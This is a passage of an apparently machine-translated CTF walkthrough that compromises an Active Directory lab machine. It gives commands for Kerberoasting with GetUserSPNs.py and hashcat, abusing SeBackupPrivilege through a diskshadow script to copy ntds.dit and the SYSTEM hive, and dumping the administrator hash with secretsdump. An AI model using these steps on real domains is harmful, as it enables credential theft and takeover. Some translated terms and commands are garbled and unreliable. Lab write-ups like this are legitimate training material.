Directory服务帐户(AD)的密码。在这种攻击中，攻击者伪装成具有服务主体名称(SPN)的帐户用户，请求具有加密密码或Kerberos的票据。</p><p id="037b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> Impacket GetUserSPN.py: </strong></p><p id="dc2a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以使用impcket的GetUserSPN.py对用户lvetrova进行kerbroast。</p><p id="885a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">语法:</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="0e18" class="lc ld iq ky b gy le lf l lg lh">GetUserSPNs.py &lt;domain_name&gt;/&lt;domain_user&gt; -hashes LNTML:NTML -request -outputfile &lt;output_TGSs_file&gt;</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/603bf4ea51d869e19d1c6d680f49c1d3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ayHRss2F_2_PWo8oVPboHg.png"/></div></div></figure><p id="9679" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到Xyan1d3的服务票。我们可以从域中请求它。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/5c8c913d340027c5df524275513406e7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OqkKGC9F1GrwZPwOP2zBIA.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">票</figcaption></figure><p id="4b7f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们只需要用hashcat来破解这个散列。</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="1da8" class="lc ld iq ky b gy le lf l lg lh">hashcat -m 13100 hash rockyou.txt </span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/3e469d14db921e15f7cb8f8586e0e158.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dAEk24loByfKqCidtGMmRQ.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">破裂</figcaption></figure><p id="bcbf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在让我们以Xyan1d3的身份登录。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/7c2c1ee35072ca3acf28e06d34376b63.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZP7MBsw27uKPMukweMty_g.png"/></div></div></figure><p id="7be6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们必须再次重复整个Pscredential解码过程。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/ad90cf90d70f7653d27f1e17f70ddd75.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UElDWuDOvbnkxQkk1gZddg.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">译解</figcaption></figure><p id="ff10" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在到了难题最棘手的部分。获取根！</p><p id="4724" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以尝试运行SharpHound.ps1</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/97b9d876546958feddb6063b558913bc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*d8UAnp0wrWZ-AHAtm6wf5A.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">上传Sharphound.ps1</figcaption></figure><p id="2f78" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">失败了。</p><p id="f6a7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">尝试了很多东西后，我发现了一些有趣的东西。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/9ecf688bf2af90fb7e3d7176bade8462.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bCy3mj9ESSrL4n7gcTrCrA.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">whoami/全部</figcaption></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi mp"><img src="../Images/522f187e3a95db01526242e4a53fbd5a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1352/format:webp/1*LQeowNfbJJeBrb4GmtigvQ.png"/></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">特权</figcaption></figure><p id="3b80" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在PEH的TCM安全健康-亚当斯没有提到这种特权是脆弱的。让我们看看。</p><div class="lo lp gp gr lq lr"><a href="https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960" rel="noopener follow" target="_blank"><div class="ls ab fo"><div class="lt ab lu cl cj lv"><h2 class="bd ir gy z fp lw fr fs lx fu fw ip bi translated">Windows特权和特权</h2><div class="ly l"><h3 class="bd b gy z fp lw fr fs lx fu fw dk translated">获取Windows域控制器计算机中的NTLM哈希</h3></div><div class="lz l"><p class="bd b dl z fp lw fr fs lx fu fw dk translated">medium.com</p></div></div><div class="ma l"><div class="mq l mc md me ma mf kr lr"/></div></div></a></div><p id="0105" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一篇很棒的文章，如果你想看视频，康达有一个很棒的视频。</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="mk mj l"/></div></figure><p id="e410" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们需要创建一个脚本来启动备份过程。</p><div class="lo lp gp gr lq lr"><a href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#abusing-backup-operators-group" rel="noopener  ugc nofollow" target="_blank"><div class="ls ab fo"><div class="lt ab lu cl cj lv"><h2 class="bd ir gy z fp lw fr fs lx fu fw ip bi translated">GitHub-S1 CBK 0y 1337/Active-Directory-Exploitation-Cheat-Sheet:一个包含常见…</h2><div class="ly l"><h3 class="bd b gy z fp lw fr fs lx fu fw dk translated">本备忘单包含Windows Active Directory的常见枚举和攻击方法。这份备忘单是…</h3></div><div class="lz l"><p class="bd b dl z fp lw fr fs lx fu fw dk translated">github.com</p></div></div><div class="ma l"><div class="mr l mc md me ma mf kr lr"/></div></div></a></div><p id="3dd9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如何创建脚本的指南。</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="808f" class="lc ld iq ky b gy le lf l lg lh">set context persistent nowriters<br/>set metadata c:\windows\system32\spool\drivers\color\example.cab<br/>set verbose on<br/>begin backup<br/>add volume c: alias mydrive<br/><br/>create<br/><br/>expose %mydrive% w:<br/>end backup</span></pre><p id="bb62" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可能需要在脚本的每一行末尾添加另一个字母。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ms"><img src="../Images/5b7007b3d09480bbc0a3c03ffb1d0032.png" data-original-src="https://miro.medium.com/v2/resize:fit:1310/format:webp/1*6bfm-2-LQH7OyPyKvk3Ikg.png"/></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">像这样</figcaption></figure><p id="5440" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于某种原因，每行的最后一个字母被跳过了。</p><p id="235c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在它工作正常。</p><p id="ad42" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">之后上传到目标。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/942316db77d3d2765bf2231f29b32f01.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VKWX_e3QPuQAilVDK2VywQ.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">脚本. txt</figcaption></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/6dd579773cb50aaee0a54f918bd80d27.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1S9Oi76eUL1Pihb1WrQ3aw.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">上传</figcaption></figure><p id="ecf5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们只需要使用diskshadow实用程序来执行它。</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="e5e8" class="lc ld iq ky b gy le lf l lg lh">diskshadow /s backup.txt</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/920cc7abd1e3e673e749d83362a12f9c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-vpBK-G_jZi7x3kdanE0rw.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">支持</figcaption></figure><p id="fdd9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第二，我们需要从下面给出的库中下载DLL文件</p><div class="lo lp gp gr lq lr"><a href="https://github.com/giuliano108/SeBackupPrivilege" rel="noopener  ugc nofollow" target="_blank"><div class="ls ab fo"><div class="lt ab lu cl cj lv"><h2 class="bd ir gy z fp lw fr fs lx fu fw ip bi translated">GitHub-giulia no 108/sebakuppprivilege:使用SE _ BACKUP _ NAME/sebakuppprivilege访问您…</h2><div class="ly l"><h3 class="bd b gy z fp lw fr fs lx fu fw dk translated">在Windows上，如果用户拥有“备份文件和目录”权限，他将被分配SE_BACKUP_NAME/…</h3></div><div class="lz l"><p class="bd b dl z fp lw fr fs lx fu fw dk translated">github.com</p></div></div><div class="ma l"><div class="mt l mc md me ma mf kr lr"/></div></div></a></div><p id="8e94" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第一个“SeBackupPrivilegeCmdLets.dll”检查是否启用了SeBackupPrivilege，第二个“SeBackupPrivilegeUtils.dll”复制文件。</p><p id="090a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请记住，在使用复制功能之前，您必须先生成要检索的文件的卷影副本。因为文件正在使用中，所以您不能直接复制它们。“Copy-filebackuppprivilege”复制功能是利用Robocopy实用程序的替代方法。</p><p id="b5ba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在使用evil-winrm的upload命令将两个Dll上传到目标。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/fc4224cc5ca66f91ffcc3d331b8b111c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*J1_kO3QAaCmoY4itReYH_w.png"/></div></div></figure><p id="6151" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们需要使用import module命令导入这些dll。</p><p id="9bd5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们可以验证我们的特权。之后，我们需要使用Copy-files ebackuppprivilege将备份复制到我们的目录中。</p><pre class="km kn ko kp gt kx ky kz la aw lb bi"><span id="639b" class="lc ld iq ky b gy le lf l lg lh">Get-SeBackupPrivilege<br/>Set-SeBackupPrivilege<br/>Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\users\xyan1d3\ntds.dit -Overwrite</span></pre><p id="ef4e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后两个命令复制ntds.dit和系统hieve文件。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/ddf21923be8c24c2665b98b76fd51382.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FRGnjL2WKr2Fmm2KIiH4aQ.png"/></div></div></figure><p id="447c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在将这些文件下载到您的主机上。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/17dd63134153d21ec80caa5c8eff3ac9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Z0MzvI3S-BiZxvOQw755zg.png"/></div></div></figure><p id="379c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们可以再次使用Secretsdump.py来获取哈希值。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/a0b2098b396be360c350da5ba46bf942.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-q42WV2Jvgu7xWOWiAeSEw.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">Secretsdump.py</figcaption></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/f07a25e282130083e70fa9214cbc2112.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9eaY6NZXUC04z2eeApH5xQ.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">AdminHASH</figcaption></figure><p id="5bbb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们现在可以以管理员身份登录。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/133389b50b484c83c0a7ede7daf5db46.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WKtn7g0C3TeuIIyKmlGV5w.png"/></div></div></figure><p id="b7e6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在只需获取主目录中的标志。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/0d21c825baa23a18a41947729bf8823c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*R-yECzq_ieP-DfbdN8IB9A.png"/></div></div><figcaption class="kt ku gj gh gi kv kw bd b be z dk translated">PS凭据</figcaption></figure><p id="0bd0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它不是pscredential，它只是一个简单的Hex。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/51501b81a901d1b59ab89ad30d2231ee.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kZzuDbT7IKg8PTImQ4jICw.png"/></div></div></figure><p id="adb5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">只要去赛博厨师或任何十六进制解码器工具，解码它。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi mu"><img src="../Images/09cfd860e1e97062c07cf67a7af5ff4f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eEH0E4SiFdoRxRAkXEwsXw.png"/></div></div></figure><p id="c253" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们还需要一面泰森旗。</p><p id="5dc5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它在威廉姆目录里。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="lj lk di ll bf lm"><div class="gh gi li"><img src="../Images/86b9a46cb2cfdd4aeb8fae1fdb5c4053.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qiBRwbqleTiFdrZ-Fz9qXw.png"/></div></div></figure><p id="b718" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后我们黑了这个。</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="mv mj l"/></div></figure><p id="52f7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">希望你喜欢。</p></div><div class="ab cl mw mx hu my" role="separator"><span class="mz bw bk na nb nc"/><span class="mz bw bk na nb nc"/><span class="mz bw bk na nb"/></div><div class="ij ik il im in"><p id="ffda" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">来自Infosec的报道:Infosec上每天都会出现很多难以跟上的内容。 <a class="ae ne" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> <em class="nd">加入我们的每周简讯</em> </strong> </a> <em class="nd">以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</em></p></div></div>    
</body>
</html>